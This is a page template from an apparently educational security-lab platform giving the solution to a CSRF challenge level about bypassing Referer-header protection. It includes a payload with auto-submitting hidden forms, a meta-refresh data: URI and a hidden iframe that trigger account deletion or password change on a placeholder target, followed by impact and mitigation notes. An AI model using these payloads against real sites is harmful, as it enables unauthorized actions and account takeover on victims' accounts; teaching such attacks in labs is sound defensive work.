{% extends 'base.html' %}

{% block title %}CSRF Level 6 Solution - R00tGlyph{% endblock %}

{% block content %}
<div class="row">
    <div class="col-md-10 offset-md-1">
        <div class="card">
            <div class="card-header bg-success text-white">
                <h2 class="text-center">
                    <i class="bi bi-lightbulb-fill me-2"></i>
                    Level 6 Solution: Referrer-based Protection Bypass
                </h2>
            </div>
            <div class="card-body">
                <div class="alert alert-info">
                    <h4><i class="bi bi-info-circle-fill me-2"></i>Challenge Overview</h4>
                    <p>This challenge demonstrates how to bypass referrer-based CSRF protection in the RefererGuard System by manipulating or removing the HTTP Referer header.</p>
                </div>

                <div class="card mb-4">
                    <div class="card-header bg-primary text-white">
                        <h4 class="mb-0"><i class="bi bi-tools me-2"></i>Tools Required</h4>
                    </div>
                    <div class="card-body">
                        <p><strong>Primary Tools:</strong> Burp Suite (for header manipulation), Browser Developer Tools, Custom HTML with meta tags</p>
                        <p><strong>Skills:</strong> HTTP header manipulation, Referer policy understanding, Meta tag exploitation</p>
                    </div>
                </div>

                <div class="card mb-4">
                    <div class="card-header bg-warning text-dark">
                        <h4 class="mb-0"><i class="bi bi-list-ol me-2"></i>Step-by-Step Solution</h4>
                    </div>
                    <div class="card-body">

                        <ol>
                            <li><strong>Analyze Referer Protection:</strong> Identify that RefererGuard System validates the HTTP Referer header</li>
                            <li><strong>Test Referer Validation:</strong> Understand what referer values are accepted by the system</li>
                            <li><strong>Use Meta Refresh Technique:</strong> Implement meta refresh to remove referer information</li>
                            <li><strong>Try Data URI Method:</strong> Use data: URIs to bypass referer checks</li>
                            <li><strong>Exploit HTTPS to HTTP:</strong> Leverage referer policy differences between protocols</li>
                            <li><strong>Execute Bypass Attack:</strong> Craft the final payload that successfully bypasses referer validation</li>
                        </ol>
                        <div class="alert alert-warning mt-3">
                            <strong>Key Insight:</strong> Referer-based protection can be bypassed using various techniques that manipulate or remove the referer header.
                        </div>
                    </div>
                </div>

                <div class="card mb-4">
                    <div class="card-header bg-success text-white">
                        <h4 class="mb-0"><i class="bi bi-code-slash me-2"></i>Payload Example</h4>
                    </div>
                    <div class="card-body">
                        <pre class="bg-dark text-light p-3 rounded"><code>&lt;!-- Referer Bypass Attack --&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;!-- Method 1: Meta refresh to remove referer --&gt;
    &lt;meta http-equiv="refresh" content="0; url=data:text/html,&lt;script&gt;
        var form = document.createElement('form');
        form.method = 'POST';
        form.action = 'http://target.com/csrf/level6';

        var input1 = document.createElement('input');
        input1.type = 'hidden';
        input1.name = 'referrer_url';
        input1.value = 'https://trusted-domain.com';
        form.appendChild(input1);

        var input2 = document.createElement('input');
        input2.type = 'hidden';
        input2.name = 'target_action';
        input2.value = 'delete_account';
        form.appendChild(input2);

        var input3 = document.createElement('input');
        input3.type = 'hidden';
        input3.name = 'payload_data';
        input3.value = 'malicious_data';
        form.appendChild(input3);

        document.body.appendChild(form);
        form.submit();
    &lt;/script&gt;"&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h3&gt;Processing...&lt;/h3&gt;

    &lt;!-- Method 2: Direct form with no referer --&gt;
    &lt;form id="csrf-form" action="http://target.com/csrf/level6" method="POST" style="display:none;"&gt;
        &lt;input type="hidden" name="referrer_url" value="https://trusted-domain.com"&gt;
        &lt;input type="hidden" name="target_action" value="change_password"&gt;
        &lt;input type="hidden" name="payload_data" value="new_password_123"&gt;
    &lt;/form&gt;

    &lt;!-- Method 3: Iframe with data URI --&gt;
    &lt;iframe src="data:text/html,&lt;form action='http://target.com/csrf/level6' method='POST'&gt;
        &lt;input type='hidden' name='referrer_url' value='https://trusted-domain.com'&gt;
        &lt;input type='hidden' name='target_action' value='update_profile'&gt;
        &lt;input type='hidden' name='payload_data' value='malicious_update'&gt;
        &lt;/form&gt;&lt;script&gt;document.forms[0].submit();&lt;/script&gt;"
        style="display:none;"&gt;&lt;/iframe&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
                    </div>
                </div>

                <div class="card mb-4">
                    <div class="card-header bg-danger text-white">
                        <h4 class="mb-0"><i class="bi bi-shield-exclamation me-2"></i>Security Impact</h4>
                    </div>
                    <div class="card-body">
                        <p>This CSRF vulnerability demonstrates how attackers can:</p>
                        <ul>
                            <li>Execute unauthorized actions on behalf of authenticated users</li>
                            <li>Bypass authentication mechanisms through cross-site requests</li>
                            <li>Potentially compromise user accounts and sensitive data</li>
                            <li>Perform state-changing operations without user consent</li>
                        </ul>
                    </div>
                </div>

                <div class="card mb-4">
                    <div class="card-header bg-success text-white">
                        <h4 class="mb-0"><i class="bi bi-shield-check me-2"></i>Mitigation Strategies</h4>
                    </div>
                    <div class="card-body">
                        <ul>
                            <li><strong>CSRF Tokens:</strong> Implement anti-CSRF tokens in all state-changing forms</li>
                            <li><strong>SameSite Cookies:</strong> Use SameSite cookie attributes to prevent cross-site requests</li>
                            <li><strong>Origin Validation:</strong> Verify the Origin and Referer headers</li>
                            <li><strong>Custom Headers:</strong> Require custom headers for AJAX requests</li>
                            <li><strong>Double Submit Cookies:</strong> Implement double submit cookie pattern</li>
                        </ul>
                    </div>
                </div>

                <div class="text-center mt-4">
                    <a href="/solutions/csrf5" class="btn btn-secondary me-2">
                        <i class="bi bi-arrow-left me-1"></i>Previous Solution
                    </a>
                    <a href="/csrf/level6" class="btn btn-primary me-2">
                        <i class="bi bi-arrow-left me-1"></i>Back to Challenge
                    </a>
                    <a href="/solutions/csrf7" class="btn btn-success">
                        <i class="bi bi-arrow-right me-1"></i>Next Solution
                    </a>
                    <a href="/challenges" class="btn btn-info ms-2">
                        <i class="bi bi-list me-1"></i>All Challenges
                    </a>
                </div>
            </div>
        </div>
    </div>
</div>
{% endblock %}